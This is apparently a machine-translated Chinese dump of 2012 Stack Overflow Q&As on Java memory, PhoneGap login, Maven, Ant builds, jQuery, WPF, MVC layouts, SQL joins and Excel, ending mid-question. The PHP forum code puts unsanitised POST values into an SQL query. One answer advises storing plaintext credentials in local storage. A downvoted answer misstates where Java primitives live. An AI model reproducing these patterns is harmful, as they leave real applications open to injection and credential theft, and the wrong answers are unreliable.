> 标签：java, memory-management, scope, variable-types

我有以下代码块：

```
class Student{

int age;               //instance variable
String name;     //instance variable

public Student()
 {
    this.age = 0;
    name = "Anonymous";
 }
public Student(int Age, String Name)
 {
    this. age = Age;
    setName(Name);
 }
public void setName(String Name)
 {
    this.name = Name;
 }
}

public class Main{
public static void main(String[] args) {
        Student s;                           //local variable
        s = new Student(23,"Jonh");
        int noStudents = 1;          //local variable
 }
} 
```

我的问题与什么是局部变量、实例变量有关，以便了解它们的分配位置，无论是在 HEAP 内存还是在堆栈内存中。在默认构造函数中，它似乎只存在一个局部变量，它是由 'this' 关键字创建的，但是如何'name = "Anonymous";' 不认为是局部变量？它是对象类型，但那些也可以是本地变量，对吗？顺便说一句，您能否举一个使用默认构造函数创建/实例化的对象的示例？谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-18T18:54:12.207

简而言之，任何类型的名称都只存储引用，它们不直接存储对象。

完全受限于代码块的名称已在堆栈帧上为引用分配存储空间，堆栈帧位于线程专用的堆栈上。

作为类成员的名称已为堆中的引用分配存储空间，位于表示该类实例的 Object 中。

作为类的静态成员的名称已为堆中的引用分配了存储空间，位于表示该类的类对象实例的对象内。

所有对象都存在于堆上；但是，对它们的引用可能存在于堆上的其他对象中，或者存在于堆栈上的引用占位符中。

所有原始数据类型都存储在存储引用的位置。

```
class Student {

  int age;         // value stored on heap within instance of Student
  String name;     // reference stored on heap within instance of Student

  public Student() {
    this.age = 0;
    name = "Anonymous";
  }

  public Student(int Age, String Name) {
    this.age = Age;
    setName(Name);
  }

  public void setName(String Name) {
    this.name = Name;
  }

}

public class Main {
  public static void main(String[] args) {
        Student s;                    // reference reserved on stack
        s = new Student(23, "John");  // reference stored on stack, object allocated on heap
        int noStudents = 1;           // value stored on stack
  }
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-18T18:51:57.023

所有原语 var (int, double, boolean) 都是在堆栈上创建的。使用“new”分配的更复杂的对象位于堆中，您的变量只是对它的引用（指针）。

局部变量是存在于特定范围内的 var，例如“Student s”仅存在于 Main 方法中（它可以在堆栈中或堆中）

# android - 在phonegap上添加登录用户

> ID：10658114
> 
> 赞同：0
> 
> 时间：2012-05-18T18:45:38.883
> 
> 标签：android, cordova, login

您好，我正在为 android 上的 phonegap 创建一个应用程序，我想看看如何创建用户登录部分。这部分应该让他们使用用户名和密码注册并输入他们的电子邮件，如果他们已经有用户名，则只需登录。我还需要一个网站来保存所有这些数据吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T07:18:18.507

您需要在来 SO 之前尝试一下。

但是要为您指明正确的方向。

1）创建一个简单的restFUL API，让人们注册

2）使用本地存储将该信息存储在用户手机上

3) 每次应用启动时，使用本地存储用户名和密码向您的服务器发出 ajax 请求

4）让用户做任何事情。

这确实是一个非常简单的过程 - 至于您的托管问题，取决于您看到的使用情况......如果您的应用程序将获得大量流量，您应该考虑基于云的解决方案。亚马逊会让你快速扩展应用程序并自动处理负载平衡，Heroku 在这方面也很擅长。即时扩展也是如此。最后获得像 Bluehost 这样的主机是一个不错的选择 - 灵活性和可靠性 - 也是一个不错的价格。

# maven - 在 Maven 中构建所有依赖项

> ID：10658117
> 
> 赞同：0
> 
> 时间：2012-05-18T18:45:47.140
> 
> 标签：maven

我的 Eclipse 中有一个 Ear、war 和 2 jar 项目。当我运行 pom inside ear 项目时，我想自动构建 2 个 jars，war 和 ear 项目。

我记得过去在 Maven 中这样做过。但是我忘记了，因为我与 Maven 失去了几年的联系。

有人请提醒我这一点..

我使用了依赖编译，但是当我直接构建耳朵时，它没有构建 jar。我应该先在 jar 中运行 pom 吗？当我构建耳朵时，它不会自动构建那个罐子吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:01:57.350

Create a multi module build that will build it all for you in the reactor. Read more about it e.g. [http://www.sonatype.com/books/mvnref-book/reference/pom-relationships-sect-pom-best-practice.html#pom-relationships-sect-multi-vs-inherit](http://www.sonatype.com/books/mvnref-book/reference/pom-relationships-sect-pom-best-practice.html#pom-relationships-sect-multi-vs-inherit)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T18:58:52.387

我想您应该将 tha`.jar`和`.war`projects 定义为项目的依赖项`.ear`。最好有一个 parent `pom`，其中所有项目都定义为模块，包括`.ear`项目。

在[这本书](http://www.sonatype.com/books/mvnex-book/reference/multimodule-web-spring.html)中，您可以找到详细解释的 Maven 多模块项目的逐步设置（带有可下载的代码）。

[JBoss 快速入门示例](https://github.com/jbossas/quickstart/tree/master/kitchensink-ear)中还有一个很好的企业多模块项目示例。

# android - 如何列出自定义目录中的所有文件

> ID：10658122
> 
> 赞同：2
> 
> 时间：2012-05-18T18:46:03.903
> 
> 标签：android, file, directory, dir

我试图列出我创建的目录中的所有文件，当我创建目录时，我将每个联系人的文件扭曲到目录中。然后我希望能够列出目录内/内的所有这些文件。我已经尝试了一切，包括

```
String a = listFiles().tostring(); 
```

然而，什么也没有发生。总而言之，我想列出 SD 卡中自定义目录中的所有文件。

**这是我更新的代码**

```
String path = Environment.getExternalStorageDirectory().getAbsolutePath();
FileInputStream iStream =  new FileInputStream(path);
String read = path.getbytes().tostring(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:51:24.073

你必须看看这个教程[如何构建一个android文件浏览器](http://www.anddev.org/building_an_android_filebrowser_list-based_-t67.html)它会对你有很大帮助！！

这列出[了](http://www.dreamincode.net/forums/topic/190013-creating-simple-file-chooser/)sdcard 中的所有文件夹和文件，您可以通过更改代码中**currentDir**的值来调整它以适应您的需要

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-30T08:50:23.703

**此代码是旅行整个 sdcard 和列表文件。这可能对你有帮助..！**

```
import java.io.*;
import java.util.*;
public class DirUtils {

  public static List recurseDir(String dir) {
      String result, _result[];

      result = recurseInDirFrom(dir);
      _result = result.split("\\|");
      return Arrays.asList(_result);
  }

  private static String recurseInDirFrom(String dirItem) {
    File file;
    String  result,list[];

    result = dirItem;

    file = new File(dirItem);
    if (file.isDirectory()) {
      list = file.list();
      File[] fileslist = file.listFiles(new MyDocFileFilter());
    if (fileslist != null) {
      for (File file1: fileslist) {
        System.out.println(file1.getAbsolutePath());
      }
    } 
    else {
      System.out.println("No Subdirectory Found.");
    }
      for (int i = 0; i < list.length; i++)
        result = result + "\n" + recurseInDirFrom(dirItem + File.separatorChar + list[i]);
      }
    return result;
  }

 static class MyDocFileFilter implements FileFilter
{
  private final String[] myDocumentExtensions 
               = new String[] {".java", ".png", ".html", "class"};

  public boolean accept(File file) {

    if (!file.isFile())
        return false;

    for (String extension : myDocumentExtensions) {
      if (file.getName().toLowerCase().endsWith(extension))
        return true;
    }
    return false;
  }
}

  public static void main(String arg[]) {
    DirUtils.recurseDir("your path ");

  }
} 
```

# uiwebview - mailto：在 UIWebView 加载的 html 页面中不起作用

> ID：10658124
> 
> 赞同：0
> 
> 时间：2012-05-18T18:46:13.310
> 
> 标签：uiwebview

如果我把这一行放在一个 html 文件中

```
<a href="mailto:frank@wwdcdemo.example.com>">John Frank</a> 
```

并在 UIWebView 中加载页面，然后 didFailLoadWithError: 使用 WebKitErrorDomain 代码 101 调用。

但是，该行已取自 Apple 文档：

[http://developer.apple.com/library/ios/#featuredarticles/iPhoneURLScheme_Reference/Articles/MailLinks.html](http://developer.apple.com/library/ios/#featuredarticles/iPhoneURLScheme_Reference/Articles/MailLinks.html)

# android - 如何解决 Android 工具中的 javac 增量构建未检测到应导致重新编译的更改？

> ID：10658134
> 
> 赞同：4
> 
> 时间：2012-05-18T18:46:46.103
> 
> 标签：android, ant, build, dependencies, javac

我和我的同事最近将我们的 Android 工具升级到 r19，并且发现 Google 引入的新增量构建系统存在问题。增量编译似乎是一个难题，而且看起来他们没有解决它，所以如果我们不小心的话，我们现在会得到损坏的 APK。

我向谷歌报告了这个问题，但我想知道是否有其他人看到它，如果是的话，也许他们可以游说谷歌修复它，这样工程人员就不会查看由于构建脚本错误而损坏的构建。

看看这里：[https ://code.google.com/p/android/issues/detail?id=31242](https://code.google.com/p/android/issues/detail?id=31242)

作为一种解决方法，我修改了 Ant 脚本以在 Google 的 Ant 脚本中的 -build-setup 步骤之前删除所有类文件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-19T00:19:59.123

该错误中描述的问题实际上[是大多数 java 编译器和工具的长期限制](http://softwareswirl.blogspot.com/2010/10/wacky-world-of-compiling-java.html)，与 .class 文件没有维护足够的信息以允许工具正确计算依赖关系有关。Javac 甚至没有走那么远，而是仅在 java 文件比相应的 .class 文件更新时重新编译。这是设计使然，甚至。

我能找到的唯一确定的答案是每次构建时删除所有类文件，使构建不是增量的。您可以通过将其添加到您的 build.xml 来做到这一点：

```
<target name="-pre-compile" depends="-pre-compile-delete"/>

<target name="-pre-compile-delete">
    <!-- Workaround for https://code.google.com/p/android/issues/detail?id=31242 -->
    <do-only-if-manifest-hasCode elseText="hasCode = false. Skipping...">
        <delete failonerror="false" dir="${out.classes.absolute.dir}"/>
    </do-only-if-manifest-hasCode>
</target> 
```

JDK 的内置工具来解决这个问题是[依赖任务](http://ant.apache.org/manual/Tasks/depend.html)。它尝试遍历类文件，并删除传递依赖关系已更改的文件。但是，正如文档中所指出的，depend 有一些限制，这些限制都源于类文件没有包含足够的信息来提供完整的依赖树。

相反，我建议使用[dependset task](http://ant.apache.org/manual/Tasks/dependset.html)一个更简单但相当健壮的解决方法。如果任何源/jar 较新，我们将删除所有类文件，而不是尝试使用依赖任务进行最小增量编译。我们可能会在实际上不需要时重新编译，但是没有更改的构建仍然更快，并且我们不会在需要时无意中跳过编译。

```
<target name="-pre-compile" depends="-pre-compile-dependset" />
<target name="-pre-compile-dependset">
    <!-- Alternative workaround for https://code.google.com/p/android/issues/detail?id=31242 -->
    <echo>Deleting all class files if newer sources (java or jars) are found...</echo>
    <do-only-if-manifest-hasCode elseText="hasCode = false. Skipping...">

        <!-- The names of these properties suggest they are single directories, but -->
        <!-- some projects with Android.mk files treat them like paths (with multiple dirs). -->
        <!-- Massage these paths get all the files inside multiple dirs. -->
        <path id="project.all.sources.path">
            <pathelement path="${source.absolute.dir}"/>
            <pathelement path="${gen.absolute.dir}"/>
        </path>

        <!-- convert project.all.sources.path to project.all.sources.list  -->
        <pathconvert
            refid="project.all.sources.path"
            property="project.all.sources.list"
            pathsep=","
            dirsep="/">

            <!-- Make the path elements relative to basedir and glob to match all files -->
            <!-- The result will look like: "src/**,gen/**" -->
            <chainedmapper>
                <filtermapper>
                    <replacestring from="${basedir}/" to=""/>
                </filtermapper>
                <regexpmapper from="^(.*)" to="\1/**"/>
            </chainedmapper>
        </pathconvert>

        <dependset verbose="true">
            <sources>
                    <!-- merge the project's own classpath and the tested project's classpath -->
                    <path refid="project.all.jars.path" />
                    <path refid="tested.project.classpath" />
                    <!-- All source files -->
                    <fileset dir="${basedir}" includes="${project.all.sources.list}" />
            </sources>
            <targets>
                <fileset dir="${out.classes.absolute.dir}"/>
            </targets>
        </dependset>
    </do-only-if-manifest-hasCode>
</target> 
```

该解决方案足够可靠，我相信它最终可以合并到 sdk 构建中。

# javascript - 带有 Wordpress 主题的 ie8 和 ie9 中的 Jquery 错误。（对象不支持此属性或方法）

> ID：10658135
> 
> 赞同：0
> 
> 时间：2012-05-18T18:46:48.473
> 
> 标签：javascript, jquery, html, internet-explorer-8, internet-explorer-9

我最近为客户[http://www.bridgechurch.us/](http://www.bridgechurch.us/)启动了一个网站，只是为了收到有关它在 ie8 或 ie9 上无法正确显示的投诉。我已经确认这是真的。IE 指向这行 Javascript：

> jQuery（函数（）{
> 
> jQuery(".scrollable").scrollable({circular: true}).navigator().autoscroll({interval: 7000});
> 
> [...]

谁能帮我弄清楚这行代码有什么问题？

谢谢

> 更新 - 已修复
> 
> 我发现在 Doctype Declaration 之前有一条评论迫使 IE 进入怪癖模式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:56:39.117

您在该页面上有很多 404，主要与特定于 ie 的 css 和边框图像有关，这可能是页面看起来不应该的原因。/images/internet_explorer/borderBottomRight.png 和 /wp-content/themes/Moses/styles/default.css 等文件未加载。

话虽如此，查看[可滚动文档](http://jquerytools.org/documentation/scrollable/index.html)，可滚动（）的返回值没有 .navigator() 函数；我在 Chrome 中遇到了同样的错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T18:57:02.987

好吧，从视觉上看，该网站在 IE9 中似乎根本无法正常运行（与 Chrome 相比）。但只要查看添加`scrollable()`到 jQuery 的代码，您就会发现该函数并不总是返回原始元素。在您的代码中，如果您将调用一分为二，则可能没问题：

```
jQuery(".scrollable").scrollable({circular: true});
jQuery(".scrollable").navigator().autoscroll({interval: 7000}); 
```

我将此归咎于插件：扩展 jQuery 的函数*应该*总是返回选择器找到的原始元素。

# c# - 强制 WPF ListBox 恰好包含 x 个元素

> ID：10658137
> 
> 赞同：2
> 
> 时间：2012-05-18T18:46:51.110
> 
> 标签：c#, wpf, listbox

我试图强制 ListBox 显示均匀数量的元素 - 也就是说，如果有超过 10 个元素，我希望它*恰好*显示10 个元素，并通过滚动使其他元素可用。我知道的唯一示例是 Visual Studio 智能感知弹出窗口。

我不想显示部分项目，因为它看起来很难看。

我尝试将高度设置为`10 * item height`，并考虑边框、边距和填充，但还有其他因素 - 例如实际边框具有 1 个像素的填充。即使考虑到尺寸也会偏离几个像素。这个解决方案正在等待爆炸。

有任何想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T13:03:46.853

使用行为来做到这一点。

行为允许您在 Xaml 中向控件添加功能。这是一个教程：[行为教程](http://wpftutorial.net/Behaviors.html)

为了让您了解这在代码中的样子：

xml:

```
<ListBox ItemsSource="{Binding MyData}">
    <i:Interactions.Behaviors>
        <b:TenItemsInViewBehavior/>
    </i:Interactions.Behaviors>
</ListBox> 
```

代码：

```
public class TenItemsInViewBehavior:Behavior<ListBox>
{
    protected override OnAttached()
    {
        base.OnAttached();
        //AssociatedObject is the ListView object - you can bind to its events
        this.AssociatedObject. SelectionChanged+=CheckIfOnTenthItem;       
    }
    private void CheckIfOnTenthItem(object sender, eventargs e)
    {
        ....
    }
} 
```

发生的情况是 Behavior 绑定到控件并使用 OnAttached() 方法通知您。发生这种情况时，您会发现 Behavior 上的一个名为“AssociatedObject”的属性填充了您的控件。您现在可以绑定到控件、其数据、事件等，并根据需要对其进行操作。

做你想做的事情的一种方法是从列表框中获取数据并将其存储在行为中，然后重新绑定前 10 条记录。一旦用户滚动到第 10 个，您就可以开始向列表中添加新项目（或根据需要操作列表）。

要获得行为，您需要下载 Expression Blend 并获取 System.Windows.Interactivity dll。拥有它后，您可以卸载 Blend。

行为是以模块化和一致的方式向控件添加额外功能的好方法。

# asp.net - asp.net mvc3 - 外部包含或跨项目共享布局？

> ID：10658140
> 
> 赞同：2
> 
> 时间：2012-05-18T18:47:00.850
> 
> 标签：asp.net, asp.net-mvc-3, coldfusion, content-management-system, areas

好的，我还是 Asp.Net 和 MVC3 的新手。我对事物越来越熟悉，但在完成我的第一个 Web 应用程序（一个简单的 Web 表单提交到数据库中）后仍在尝试。现在我正在从事一些较小的项目，例如转换一些提交电子邮件的旧 ColdFusion Web 表单。我在 MVC3 中很容易做到这一点，但我们所有的网页都在一个单独的内容管理系统中，我们的中心 HTML 模板就在其中。我已经[在这里问过一个关于这个的问题](https://stackoverflow.com/questions/9503577/using-asp-net-mvc3-code-inside-a-static-html-cms)，但没有得到任何结果。

我们所拥有的是，我们的大部分网页都从 CMS 导出为直接的 HTML 文件，只有需要数据库访问或编程语言的网页才会导出为 ColdFusion。在我们的 CMS 的模板中“包含”要使用的 ColdFusion 代码非常容易。我希望能够在我的 mvc3 项目中使用这个 HTML 模板，但我发现无法执行“包含”或链接到外部文件。我不确定这将如何工作，所以我决定将模板复制/粘贴到 mvc3 并想办法在我将成为的所有小项目之间共享这个模板（现在是“布局”）工作。如果模板发生变化，我不想更新每一个小的 mvc3 Web 应用程序。我学会了使用“区域”，但似乎你可以'

我真正需要的是一种让小型 mvc3 项目使用一个模板的方法，这些小型 mvc3 项目分散在我们的 Web 服务器上。这最好在一个发布到多个不同文件夹的大型项目中完成，还是在许多可以共享公共布局的小项目中完成？这两种可能吗？

在尝试和试验了所有这些之后，我开始认为 MVC 无法满足我的需求。它似乎更适合 Intranet 应用程序或整个网站，而不是像我想要的那样的“这里和那里”应用程序。我应该学习 Web 表单吗？我知道我可以在我们的 CMS 中“包含”一个 aspx 文件，就像使用 ColdFusion 一样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:33:19.757

您的模板是否必须从 CMS 中“导出”？或者，您能否拥有一个“存在”在静态 CMS URL 上的模板？这就是我们为需要数据库访问/无法在 CMS 中轻松完成但需要共享相同外观的应用程序所做的。

您可以做的是将普通的旧 HTML 文件放在 URL 上，例如[https://cms.domain.tld/templates/designxyz.html](https://cms.domain.tld/templates/designxyz.html)。该文件将提供基本布局，除了您的自定义应用程序内容所在的位置外，您只需使用字符串“内容在此处”。

然后，从 MVC 应用程序中，您可以调用此 URL 以将 HTML 内容作为字符串获取。获得字符串后，您可以在“内容到这里”字符串之前和之后将其拆分为 2。然后，在您的 layout.cshtml 文件中，您可以执行以下操作：

```
@{
    const string contentPlaceholder = "content goes here";
    var allHtml = GetHtmlTemplateFromLiveServer();
    var index = allHtml.IndexOf(contentPlaceholder);
    var topHtml = allHtml.Substring(0, index);
    var botHtml = allHtml.Substring(index + contentPlaceHolder.Length);
}
@topHtml
@RenderBody()
@botHtml 
```

如果这样的方法有效，您可以将所有这些抽象为 HTML 帮助程序，然后在其他项目中重用该帮助程序（NuGet 会很好）。

_Layout.cshtml

```
@{
    var options = new CmsTemplateRenderOptions
    {
        Url = "https://cms.domain.tld/templates/designxyz.html",
        Cache = new TimeSpan(1, 0, 0);
    };
}
@Html.RenderCmsTemplate(CmsTemplateRenderRegion.Top, options)
@RenderBody()
@Html.RenderCmsTemplate(CmsTemplateRenderRegion.Bottom, options) 
```

然后，要更新所有应用程序的布局，您只需将更改发布到[https://cms.domain.tld/templates/designxyz.html](https://cms.domain.tld/templates/designxyz.html) URL。

# facebook - Do I need this code for the Facebook Like box to work?

> ID：10658143
> 
> 赞同：0
> 
> 时间：2012-05-18T18:47:14.220
> 
> 标签：facebook, wordpress, facebook-graph-api

I was trying to clean up some code that a friend helped me with a while back, and I ran across a text widget that displays my Facebook Like box. I've pasted the code below. Do I need all of this code? When I go to Facebook and try set up the Like Box from scratch, it does not have the . I didn't know what that was for, and if I needed it. Also should I have the in the text widget or put that in the header.php file ?

```
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<div class="fb-like-box" data-href="http://www.facebook.com/noahsdadcom" data-width="300" data-colorscheme="dark" data-show-faces="true" data-stream="false" data-header="false"></div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T18:49:58.807

Yes, you need all this code for facebook likebox to work.
Also, dont try to clean, unless you know `alot` about that language (experience ;) )

# vb.net - CA2000：在失去范围和 Form.Show() 之前处置对象

> ID：10658144
> 
> 赞同：1
> 
> 时间：2012-05-18T18:47:20.270
> 
> 标签：vb.net, visual-studio-2010

我正在尝试根据 Microsoft 代码分析 (CA:XXXXX) 修复我的所有项目警告

警告之一是“CA2000：在失去范围之前处置对象”

我的代码是：

```
Private sub Foo()
   Dim O As New Form1()
   O.Show()
End Sub 
```

Visual Studio 说对象 O 不是一次性的，在这种情况下我不能使用关键字 USING 因为我会在之后丢失对象 O `End Using`：

```
Private sub Foo()
   Using O As New Form1()
      O.Show()  'The form will open then close !!!
   End Using
End Sub 
```

然后表格将打开和关闭

这种情况下如何用CA2000搭车，不用理会，我要解决和修复。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:50:16.397

> 我不需要忽略，我要解决和修复。

在这种特定情况下，这实际上是一个错误的警告。在这种特定情况下，您不想“解决和修复”此消息，因为您希望对象“存活”在本地范围的末尾之外。

如果您`Dispose`在该范围内调用对象，您将（总是）关闭表单，在这种情况下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T06:23:20.347

怎么样`ShowDialog`？

```
Private sub Foo()
   Using O As New Form1()
      O.ShowDialog()
   End Using
End Sub 
```

它将`Form1`在 i 关闭后处理所有资源。

# jquery - 使用另一个容器 w jQuery 选择 div

> ID：10658146
> 
> 赞同：0
> 
> 时间：2012-05-18T18:47:23.657
> 
> 标签：jquery

我有一个容器，里面有其他 div。我需要能够仅单击其中具有“clickMe”类的那些。

```
<div id="hiddenDiv">
  <div id="val1" class="clickMe">Straight</div>
  <div id="val2">Left</div>
  <div id="somthElse" class="clickMe">Right</div>
</div> 
```

它看起来很简单，但它对我不起作用......

```
$("#hiddenDiv div.clickMe").click(function(){
      ...
} 
```

我错过了什么？

* * *

更新：

不知道它是什么，但改变它来`$("#hiddenDiv div.clickMe").live("click", function(){`修复它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:52:19.083

你有错别字。尝试这个：

### HTML

```
<div id="hiddenDiv">
  <div id="val1" class="clickMe">Straight</div>
  <div id="val2">Left</div>
  <div id="somthElse" class="clickMe">Right</div> <!-- Was missing closing 
                                                       quote on class attr -->
</div>​ 
```

### 脚本

```
$("#hiddenDiv div.clickMe").click(function(){
      alert('clicked');
});​ // Was missing closing paren and semi-colon. 
```

**工作示例**：http: [//jsfiddle.net/ebFw6/](http://jsfiddle.net/ebFw6/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T18:54:13.103

您在 html 和 js 代码中遗漏了一些小东西，尽管这是最终结果 [http://jsfiddle.net/RZ74s/](http://jsfiddle.net/RZ74s/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T18:48:54.160

更新：

您将需要修复缺少的报价：

`<div id="somthElse" class="clickMe>Right</div>` 在 clickMe 之后缺少结束引号。 `<div id="somthElse" class="clickMe">Right</div>`

容器 div 是隐藏的，所以你不能点击它。删除`style="display:none"`

# javascript - 在 Rails 3.2 中为 Twitter Bootstrap 的“bootstrap-popover.js”设计“popovers”样式

> ID：10658151
> 
> 赞同：1
> 
> 时间：2012-05-18T18:47:37.807
> 
> 标签：javascript, jquery, twitter-bootstrap, ruby-on-rails-3.2

[在此处](http://twitter.github.com/bootstrap/javascript.html#popover)使用 Rails 3.2 和 Twitter Bootstrap “bootstrap-popover.js” 和 “bootstrap-tooltip.js”

这就是我想要发生的事情：

![磷](../Images/c1aa51c0d175fbb184d74b5e4121f81a.png)

当我将鼠标悬停在：

```
 <li>
  <a href="#" class="thumbnail"><img src="http://placehold.it/125x100" alt=""></a>
 </li> 
```

在“bootstrap-popover.js”和“bootstrap-tooltip.js”中我都有**$('a').popover(placement:'top');**。

我还可以指定哪些其他选项以使弹出窗口看起来像上图一样，带有选项“A 标题”和“这里有一些很棒的内容。非常吸引人，对吧？”

这是我目前得到的图片：

![在此处输入图像描述](../Images/d41432d8d704963e918a89db48e79208.png)

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T22:59:46.377

这是一个听起来像你想要的工作示例：http: [//jsfiddle.net/chapmanc/DuKCg/4/](http://jsfiddle.net/chapmanc/DuKCg/4/)

此外，您只需将 javascript 行放在一个地方。我通常使用我的所有自定义函数创建一个新的 .js 文件，并将其包含在我的页面中，就像包含弹出框和工具提示脚本一样。

例如，文件的底部可能如下所示：

```
<script src="js/jquery.js" type="text/javascript"></script> 
<script src="js/bootstrap.js" type="text/javascript"></script>
<script src="js/bootstrap-tooltip.js" type="text/javascript"></script>
<script src="js/bootstrap-popover.js" type="text/javascript"></script>
<script src="js/customFunctions.js" type="text/javascript"></script> 
```

使用 customFunctions.js 具有：

```
$('a').popover({placement:'right'}); 
```

# php - 在另一个表 PHP 中按列排序

> ID：10658161
> 
> 赞同：1
> 
> 时间：2012-05-18T18:48:38.613
> 
> 标签：php, mysql

我有这样的桌子

COUNT tbl id、userid、linkid、count

```
 4
                         1
                         6 
```

链接表

```
id,  linkname,  linkurl 
```

我想要做的是按计数列的顺序对“链接名称”列进行排序，并将其放入一个数组中。我很挣扎，因为我不了解如何使用 JOIN。

我需要获取 linkid WHERE userid = $userid

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:51:45.087

试试这个：

```
$userid = intval( $userid ); // Hopefully it's already an integer, 
                             // but protect yourself from SQL Injection

SELECT linkname, C.count FROM Links INNER JOIN `Count` C ON C.linkid = Links.id
WHERE userid = $userid
ORDER BY C.count ASC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T18:52:39.570

试试这个：`SELECT * FROM Links L JOIN Count C ON L.id = C.linkid`那么你应该有一个计数列。

另外，我建议您不要使用“count”作为表名，因为它是 SQL 保留字。

# .net - 如何追踪“无法加载类型”错误消息

> ID：10658165
> 
> 赞同：1
> 
> 时间：2012-05-18T18:48:58.570
> 
> 标签：.net, silverlight-5.0

我正在尝试将 .NET 解决方案从 SL3 升级到 SL5，以及升级到 .NET 4

我在升级 System.Windows.Interactivity.dll 时遇到问题

SL3 版本是 1.0.1327.0 SL5 版本是 2.1.20402.0

替换 DLL 并删除旧服务引用然后添加新服务引用后，IDE 给我以下消息

```
Could not load type 'System.Windows.Controls.VirtualizingPanel' from assembly 'System.Windows, Version=2.0.5.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e'. 
```

我不明白为什么应用程序试图引用 2.0.50 版本的 System.Windows（实际上引用是 5.0.5.0）。我现在完全陷入困境，不知道如何追查问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:21:02.787

删除并重新添加所有参考，确保它们都是正确的版本。此外，请仔细检查您的项目应用程序池并确保它们与 .dll 兼容，这是一个很好的起点。

# php - 在我的论坛脚本中移动主题系统

> ID：10658166
> 
> 赞同：0
> 
> 时间：2012-05-18T18:49:02.350
> 
> 标签：php, mysql, smarty

我有包含以下代码的文件 forum.php：

```
$tpc = $db->query("SELECT * FROM ".$pre."FORUMS 
WHERE FORUM_HIDDEN='0' AND FORUM_LEVEL='0' ORDER BY FORUM_ORDER");
$ntopics = $db->CNrows();
while($rs = $db->record()){
    $forumt[] = $rs;
}
$tmp->assign('forumt',$forumt); 
```

我有这个聪明的文件 forum.tpl 和这个代码：

1-

`<input type="checkbox" name="tpcs[]" id="tpcs" value="{$topic[topic].ID}" />`

2-

```
<form action="tr_action.php?action=tmove" method="POST">
  <select name="movet">
  {section name=forumt loop=$forumt}
  <option value="{$forumt[forumt].ID}">
  {$forumt[forumt].FORUM_NAME} -- {$forumt[forumt].ID}</option>
  {/section}
  </select>
  <input class="button" type="submit" value="move topics to :" />
</form> 
```

这是 tr_action.php 文件：

```
if($action == 'tmove') {
    $tpcs = $_POST['tpcs'];
    $f_to = intval($_POST['movet']);
    $topicsid = implode(", ",$tpcs);
    if(!$f_to) {
        $err = 'you must choose an forum';
        $tmp->assign('msg','false');
    } else {
        if(count($tpcs) > 0) {
            $db->query("UPDATE ".$pre."TOPICS SET F_ID='".$ftid."' WHERE ID IN (".$topicsid.")");
            $err = 'moved successfuly..';
            $tmp->assign('msg','true');
            $redirect = '<meta http-equiv="refresh" content="1; url='.$_SERVER['HTTP_REFERER'].'" />';
        } else {
            $err = 'you must choose an topic';
            $tmp->assign('msg','false');
        }
    }
} 
```

但是当我测试这段代码时，我得到了这个错误：

> 警告：implode() [function.implode]：第 293 行 C:\xampp\htdocs\mf2\tr_action.php 中传递的参数无效

# excel - 如何将 Mid 函数应用于 Excel 中的此字符串？

> ID：10658173
> 
> 赞同：0
> 
> 时间：2012-05-18T18:49:29.053
> 
> 标签：excel, function

我正在尝试在 Excel 中使用 Mid 函数，但我被卡住了。

在 A 列中，有一个如下所示的字符串：_string_unwanted

其中 _ 等于一个空格，“string”是我要提取的可变长度字符串，_ 是第二个空格，“unwanted”是我不关心的可变长度字符串。

这是我的函数： = Mid(A1, 2, **__** )

因为我想忽略第一个空格，所以我将“2”从第二个字符位置开始。我在**_**中放入什么以便它找到可变长度的字符串？意思是，它只是隔离了上述字符串的“字符串”部分......并忽略了 2 个空格和“不需要的”字符串？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:53:26.100

你在找这个吗：-

```
=MID(A1,2,LEN(A1)-1) 
```

**结果：**

```
string_unwanted 
```

## 编辑：

这是公式：-

```
=MID(A1,2,FIND("_",A1,2)-2) 
```

**结果：**

```
string 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T18:59:31.730

怎么样：

```
=MID(A1,2,LEN(A1)-LEN("_unwanted")-1) 
```

# r - 绘制得分最高和得分最低的球队

> ID：10658178
> 
> 赞同：0
> 
> 时间：2012-05-18T18:49:57.180
> 
> 标签：r, ggplot2

我有一个这样的数据框

```
Date    Team   Score
1/1/2010 A     10
1/1/2010 B     15
1/1/2010 C     90
1/1/2010 D     100
1/1/2010 E     27
1/1/2010 F     76
1/1/2010 G     10
1/1/2010 H    85
1/1/2010 I     10
1/1/2010 J     5
1/1/2010 K     56
1/1/2010 K     60
1/1/2010 M     15
1/2/2010 A     10
1/2/2010 B     15
1/2/2010 C     90
1/2/2010 D     100
1/2/2010 E     27
1/2/2010 F     76
1/2/2010 G     10
1/2/2010 H    85
1/2/2010 I     10
1/2/2010 J     5
